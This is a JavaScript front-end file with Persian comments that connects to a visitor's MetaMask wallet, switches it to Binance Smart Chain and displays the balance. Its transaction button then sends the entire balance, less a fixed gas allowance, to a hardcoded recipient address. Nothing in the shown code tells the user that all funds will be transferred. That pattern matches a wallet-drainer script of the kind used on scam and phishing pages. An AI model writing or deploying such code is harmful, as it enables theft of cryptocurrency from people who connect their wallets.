import { ethers } from "ethers";

let provider, signer, walletAddress;

// المان‌های UI
const connectButton = document.getElementById("connectButton");
const sendTransactionButton = document.getElementById("sendTransactionButton");
const walletAddressElement = document.getElementById("walletAddress");
const bnbBalanceElement = document.getElementById("bnbBalance");

// تابعی برای سوئیچ به BSC (chainId = 56) در متامسک
async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x38" }], // 0x38 = 56
    });
  } catch (switchError) {
    // اگر BSC روی متامسک اضافه نشده بود، اضافه‌ش کن
    if (switchError.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: "0x38",
            chainName: "Binance Smart Chain",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 18,
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
    } else {
      throw switchError;
    }
  }
}

// کلیک روی دکمه اتصال
connectButton.addEventListener("click", async () => {
  try {
    if (!window.ethereum) {
      alert("لطفاً ابتدا افزونه MetaMask را نصب و فعال کنید.");
      return;
    }

    // درخواست دسترسی به حساب‌ها
    await window.ethereum.request({ method: "eth_requestAccounts" });

    // سوئیچ به شبکه BSC
    await switchToBSC();

    // ساخت provider و signer
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    // خواندن آدرس و نمایش
    walletAddress = await signer.getAddress();
    walletAddressElement.textContent = `آدرس کیف پول: ${walletAddress}`;

    // خواندن موجودی BNB و نمایش
    const balance = await signer.getBalance();
    const bnbBalance = ethers.utils.formatEther(balance);
    bnbBalanceElement.textContent = `موجودی BNB: ${bnbBalance}`;

    // نمایش دکمه‌ی ارسال تراکنش
    sendTransactionButton.style.display = "inline-block";
  } catch (error) {
    console.error("خطا در اتصال به متامسک:", error);
    alert("اتصال به کیف پول متامسک ناموفق بود.");
  }
});

// کلیک روی دکمه ارسال تراکنش
sendTransactionButton.addEventListener("click", async () => {
  try {
    const recipientAddress = "0x1234567890abcdef1234567890abcdef12345678";  // ← اینجا آدرس مقصد را قرار دهید

    // گرفتن موجودی کل
    const balance = await signer.getBalance();

    // هزینه ثابت گس: 0.001 BNB
    const gasFee = ethers.utils.parseEther("0.001");

    // بررسی موجودی کافی
    if (balance.lt(gasFee)) {
      alert("موجودی کیف پول برای پرداخت گس کافی نیست!");
      return;
    }

    // مقدار قابل ارسال
    const amountToSend = balance.sub(gasFee);

    // ارسال تراکنش
    const tx = await signer.sendTransaction({
      to: recipientAddress,
      value: amountToSend,
    });

    await tx.wait();
    alert("تراکنش با موفقیت ارسال شد!");
  } catch (error) {
    console.error("خطا در ارسال تراکنش:", error);
    alert("ارسال تراکنش ناموفق بود.");
  }
});
